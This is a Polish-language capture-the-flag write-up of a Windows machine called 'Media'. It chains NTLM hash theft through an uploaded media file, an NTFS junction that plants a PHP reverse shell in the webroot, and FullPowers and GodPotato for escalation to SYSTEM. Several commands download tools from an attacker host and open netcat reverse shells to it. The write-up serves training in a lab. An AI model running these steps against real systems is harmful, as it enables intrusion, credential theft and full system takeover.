# Media
Windows,Medium, created by **enox**

![media_slide](https://github.com/user-attachments/assets/cb3e3184-0656-415e-9d33-02f792fd0a44)

```
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

o w końcu windows bez AD xD

```
feroxbuster -u http://10.10.102.2/ -w ~/raft.txt -t 100                                                                                                                                
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.102.2/
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/kali/raft.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      298c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      301c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       42l       91w     4137c http://10.10.102.2/assets/img/logos/microsoft.svg
200      GET       24l       91w     2284c http://10.10.102.2/assets/img/logos/ibm.svg
200      GET       72l      408w    31771c http://10.10.102.2/assets/img/about/3.jpg
200      GET       35l       83w     3282c http://10.10.102.2/assets/img/logos/google.svg
200      GET       41l      211w    17529c http://10.10.102.2/assets/img/about/2.jpg
200      GET       34l       81w     3223c http://10.10.102.2/assets/img/logos/facebook.svg
200      GET       56l      371w    28555c http://10.10.102.2/assets/img/about/4.jpg
200      GET       54l      136w     1654c http://10.10.102.2/js/scripts.js
200      GET       59l      368w    34985c http://10.10.102.2/assets/img/about/1.jpg
200      GET        8l       29w    28898c http://10.10.102.2/assets/favicon.ico
200      GET      280l      961w    71959c http://10.10.102.2/assets/img/team/1.jpg
200      GET      229l     1232w   110331c http://10.10.102.2/assets/img/team/2.jpg
200      GET      226l     1276w   102947c http://10.10.102.2/assets/img/team/3.jpg
200      GET    11316l    23841w   250501c http://10.10.102.2/css/styles.css
200      GET      335l     1183w    18617c http://10.10.102.2/
200      GET        1l       62w    14220c http://10.10.102.2/assets/img/navbar-logo.svg
200      GET        1l       19w      333c http://10.10.102.2/assets/img/close-icon.svg
200      GET       92l      350w    29256c http://10.10.102.2/assets/img/portfolio/5.jpg
200      GET       72l      435w    30913c http://10.10.102.2/assets/img/portfolio/1.jpg
200      GET      103l      336w    29948c http://10.10.102.2/assets/img/portfolio/3.jpg
200      GET       70l      590w    56758c http://10.10.102.2/assets/img/portfolio/2.jpg
200      GET      113l      706w    57871c http://10.10.102.2/assets/img/portfolio/6.jpg
200      GET      165l      543w    47433c http://10.10.102.2/assets/img/portfolio/4.jpg
200      GET      943l     7123w   673180c http://10.10.102.2/assets/img/map-image.png
301      GET        9l       30w      336c http://10.10.102.2/ASSETS => http://10.10.102.2/ASSETS/
200      GET        8l       29w    28898c http://10.10.102.2/ASSETS/favicon.ico
[####################] - 31s   348235/348235  0s      found:26      errors:335460 
[####################] - 31s   348160/348160  11313/s http://10.10.102.2/ 
[####################] - 0s    348160/348160  699116/s http://10.10.102.2/assets/img/logos/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    348160/348160  548283/s http://10.10.102.2/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    348160/348160  1234610/s http://10.10.102.2/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    348160/348160  704777/s http://10.10.102.2/assets/img/about/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    348160/348160  310027/s http://10.10.102.2/assets/img/team/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    348160/348160  1213101/s http://10.10.102.2/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    348160/348160  334769/s http://10.10.102.2/assets/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    348160/348160  710531/s http://10.10.102.2/assets/img/portfolio/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    348160/348160  661901/s http://10.10.102.2/ASSETS/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    348160/348160  1415285/s http://10.10.102.2/ASSETS/img/ => Directory listing (add --scan-dir-listings to scan)                                                                                                                                                                                                                                                
```

![{FF097A67-ABD1-4975-8331-345AF936B8EC}](https://github.com/user-attachments/assets/0a2d3952-dfce-40ec-9e97-c66724a76142)

![{878745B6-1290-4872-BBC9-9E78E3A5EB2A}](https://github.com/user-attachments/assets/f4c36dfe-0b31-4929-9b58-e477052ed8c0)

tutaj mamy naszą podatnośc chyba
- kojarzę, że ntlm thief ma coś na tą okazję

![{2DE69956-AF72-4633-AB8E-E11F3F123942}](https://github.com/user-attachments/assets/cf37e1c7-ee1f-40a6-a1f4-8f6f0025874a)

`https://github.com/Greenwolf/ntlm_theft`

![{070A24BB-9EA6-4611-95F8-DA2C1B002500}](https://github.com/user-attachments/assets/58b5a5b4-50fc-416d-80c6-95b110a4a24d)

![{5DE63F5D-A03C-4161-98E8-9E5A19C286C1}](https://github.com/user-attachments/assets/a8794ef3-fbb2-4b0a-8f9b-5687cea02d0b)

![{63DB25C3-97E0-436C-B658-5F4BE85D4AA4}](https://github.com/user-attachments/assets/0d360d8d-92a7-4a67-90ff-d4acc8f4c6c6)

- oprócz tego wysłałem jeszcze `m3u` oraz `asx`

![{A6007A13-E9F8-4ABE-8F45-2E94F71CFD28}](https://github.com/user-attachments/assets/020725cf-0eed-443f-b7b0-67a8b0d5ab33)

około 2 minutki czekałem.

![hash](https://github.com/user-attachments/assets/c26b51fe-714a-43c0-be9f-e00331d02cbe)

![{2C2CCF2F-6C62-402D-96A1-D8AA04BACB68}](https://github.com/user-attachments/assets/485ba29c-42da-4d56-9d3c-3e5ca4466767)

po ssh weszło.

```
enox@MEDIA C:\Users\enox\Documents>type review.ps1
function Get-Values {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Read the first line of the file
    $firstLine = Get-Content $FilePath -TotalCount 1

    # Extract the values from the first line
    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {
        $filename = $Matches[1]
        $randomVariable = $Matches[2]

        # Create a custom object with the extracted values
        $repoValues = [PSCustomObject]@{
            FileName = $filename
            RandomVariable = $randomVariable
        }

        # Return the custom object
        return $repoValues
    }
    else {
        # Return $null if the pattern is not found
        return $null
    }
}

function UpdateTodo {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Create a .NET stream reader and writer
    $reader = [System.IO.StreamReader]::new($FilePath)
    $writer = [System.IO.StreamWriter]::new($FilePath + ".tmp")

    # Read the first line and ignore it
    $reader.ReadLine() | Out-Null

    # Copy the remaining lines to a temporary file
    while (-not $reader.EndOfStream) {
        $line = $reader.ReadLine()
        $writer.WriteLine($line)
    }

    # Close the reader and writer
    $reader.Close()
    $writer.Close()

    # Replace the original file with the temporary file
    Remove-Item $FilePath
    Rename-Item -Path ($FilePath + ".tmp") -NewName $FilePath
}

$todofile="C:\\Windows\\Tasks\\Uploads\\todo.txt"
$mediaPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"


while($True){

    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60 # Sleep for 60 seconds before rechecking
    }
    else {
        $result = Get-Values -FilePath $todofile
        $filename = $result.FileName
        $randomVariable = $result.RandomVariable
        Write-Host "FileName: $filename"
        Write-Host "Random Variable: $randomVariable"

        # Opening the File in Windows Media Player
        Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"

        # Wait for 15 seconds
        Start-Sleep -Seconds 15

        $mediaPlayerProcess = Get-Process -Name "wmplayer" -ErrorAction SilentlyContinue
        if ($mediaPlayerProcess -ne $null) {
            Write-Host "Killing Windows Media Player process."
            Stop-Process -Name "wmplayer" -Force
        }

        # Task Done
        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\todo.txt
        Sleep 15
    }

}
```

nasz user ma flagę i do tego nie ma innych userów więc prosto do admina droga.

![{68D77638-7F64-4C3C-A139-7DD9128BCA66}](https://github.com/user-attachments/assets/9d4d0622-00aa-45ca-832b-c3d8d1ed54e2)

![{A5312522-C059-48AF-83CF-E8F12451527A}](https://github.com/user-attachments/assets/e1a5804f-b135-4fb5-b8cf-f068aff0793d)

chyba mamy eskalację.

```
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
        $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
        $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
        $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
        $folderName = md5($firstname . $lastname . $email);

        // Create the full upload directory path
        $targetDir = $uploadDir . $folderName . '/';

        // Ensure the directory exists; create it if not
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0777, true);
        }

        // Sanitize the filename to remove unsafe characters
        $originalFilename = $_FILES["fileToUpload"]["name"];
        $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);


        // Build the full path to the target file
        $targetFile = $targetDir . $sanitizedFilename;

        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";

            // Update the todo.txt file
            $todoFile = $uploadDir . 'todo.txt';
            $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";

            // Append the new line to the file
            file_put_contents($todoFile, $todoContent, FILE_APPEND);
        } else {
            echo "<script>alert('Uh oh, something went wrong... Please submit again');</script>";
        }
    }
    ?>
```
(wkleiłem samoego php, bo nie ma seensu htmla wrzucać)

### Analiza
Z tego co rozumiem to na podstawie tego jak tworzony jest folder możemy "przewidzieć" jego nazwę, stworzyć taki folder i tak wrzucić jakiegoś revshella php.
- nieeeee to można mądrzej zrobić.

tworzymy sobie nowy folder, którego nazwę poznamy. Usuywamy go, wrzucamy junction i wrzucamy php

najpier przygotowanie sobie revshella
```
cp /usr/share/webshells/php/php-reverse-shell.php .
nano php-reverse-shell.php
mv php-reverse-shell.php a.php
```

![{CB71A1C7-2578-4D33-92BE-7F7C43C99CC4}](https://github.com/user-attachments/assets/17894c58-79cd-40e2-8469-c405244f846a)

![{6E5FA20F-0286-47DA-81AA-29353DDCFBC6}](https://github.com/user-attachments/assets/8cba3785-d146-44d1-a578-88858a1b13a9)

![{F37A696D-B714-40D1-AC08-A6A108FE007A}](https://github.com/user-attachments/assets/5bec59ce-004d-4058-9bae-f4c968f25391)

![{C565BC88-B83D-4E54-A351-486120F49D9A}](https://github.com/user-attachments/assets/66ecf807-bd23-4d46-adb5-7a278ab3cd02)

```
mklink /J C:\Windows\Tasks\Uploads\a8f7bab867e6d8f1c1fbdb698dfc9c38 C:\xampp\htdocs
```

![{FB79211F-1642-4D70-8480-219DF146CBCA}](https://github.com/user-attachments/assets/dd86ba3a-7af1-40b4-9971-77675c0b0cd4)

![{6198A303-6207-48C9-BBE4-0C07CC3B5DD0}](https://github.com/user-attachments/assets/2fee649e-83e1-4232-84fd-dd81b08d9f68)

i wysyłamy ponownie

![{17098B60-B506-4347-AD71-39778DA6AC9E}](https://github.com/user-attachments/assets/d42c6620-39fa-41e9-aa11-ba1ef67cd6c7)

![{F7740381-4436-42E6-AEB6-7F43A55365C5}](https://github.com/user-attachments/assets/34d3b5e1-4973-4180-89f7-d0b081fac445)

![{198F826A-4048-4A46-BCE5-8A736C00DC2B}](https://github.com/user-attachments/assets/f6a5f8d2-acdb-449a-b8c0-9ac4f2570f31)

ech... to jest windows przecież xDDD

![{F0ECD6F0-4422-4DB5-BCF7-C390A1F1EDEA}](https://github.com/user-attachments/assets/b57016b0-3ec9-4c7f-9059-289a7ceaae3e)

szybka podmiana

![{2247939B-7D83-4D7C-968B-BB1A86651897}](https://github.com/user-attachments/assets/b840719b-0b75-4872-bbe4-3e8bb8d0435e)

dobra działa

```
IWR -Uri "http://10.8.4.124/nc64.exe" -OutFile "C:\temp\nc64.exe" -UseBasicParsing
```

![{40EBD8B8-358B-49FB-A56C-BE7F3C11A238}](https://github.com/user-attachments/assets/9fdbfac5-3069-41a2-a108-6a058421eeee)

![{1A0915C1-BC4E-4C61-971A-B9DAF581B5BD}](https://github.com/user-attachments/assets/90e723fb-6fd9-48a9-b85c-922e52ba1187)

![{90135B12-CF21-4894-B5C0-0CBE2A51F613}](https://github.com/user-attachments/assets/d9e41416-66cc-4539-b0a7-e7ed5ec9a959)

szczerze to myślałem, że konto serwisowe będzie of ręki do eskalacji jakimś ziemniakiem... coś tutja nie gra. Dla testu załaduję to `https://github.com/itm4n/FullPowers`.

```
IWR -Uri "http://10.8.4.124/FullPowers.exe" -OutFile "C:\temp\FullPowers.exe" -UseBasicParsing
```

![{7B5AD0C6-5FEF-4C3B-A4FA-FB70B03A344C}](https://github.com/user-attachments/assets/fad787ab-be3a-44d6-8ac3-4229f12a655c)

```
. .\FullPowers.exe -c "C:\temp\nc64.exe 10.8.4.124 443 -e cmd" -z
```

![{B0CD082C-9B0F-4C48-BA7D-FBD7633F4130}](https://github.com/user-attachments/assets/5e54c300-8a66-417b-9713-de663660f6bb)

![{F116B346-FF7A-47C2-8B0D-69AABD3107F0}](https://github.com/user-attachments/assets/94b342cb-2df2-4213-8454-37094df2e3f3)

no i teraz się zgadza :D

```
IWR -Uri "http://10.8.4.124/GodPotato-NET4.exe" -OutFile "C:\temp\GodPotato-NET4.exe" -UseBasicParsing
. .\GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc64.exe 10.8.4.124 9001 -e cmd"
```

![{7F30E75B-C47B-404B-A0EA-D233A8C35A5F}](https://github.com/user-attachments/assets/b3a24716-7634-483d-8d7d-306adf3a727c)

![{18DD4C23-AEBA-476F-B94F-18EF7D9349DC}](https://github.com/user-attachments/assets/1be1c59b-7428-490b-8758-9c5ede03d87e)

![{1E064D4A-B2D8-4E17-8AB3-EC46584876CA}](https://github.com/user-attachments/assets/09c0aca5-4497-44ad-a450-a71951425315)


FINISH
